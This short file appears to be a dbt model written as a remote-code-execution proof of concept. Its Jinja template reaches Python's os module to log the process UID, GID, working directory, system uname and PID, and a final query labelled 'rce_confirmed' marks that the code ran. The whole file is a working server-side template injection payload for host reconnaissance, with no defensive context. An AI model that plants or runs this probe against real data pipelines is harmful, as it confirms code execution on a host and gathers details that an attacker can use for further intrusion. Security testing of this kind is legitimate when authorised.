{{ log("UID: " ~ modules.os.getuid().__str__(), info=True) }}
{{ log("GID: " ~ modules.os.getgid().__str__(), info=True) }}
{{ log("CWD: " ~ modules.os.getcwd(), info=True) }}
{{ log("UNAME: " ~ modules.os.uname().__str__(), info=True) }}
{{ log("PID: " ~ modules.os.getpid().__str__(), info=True) }}

SELECT 1 as rce_confirmed
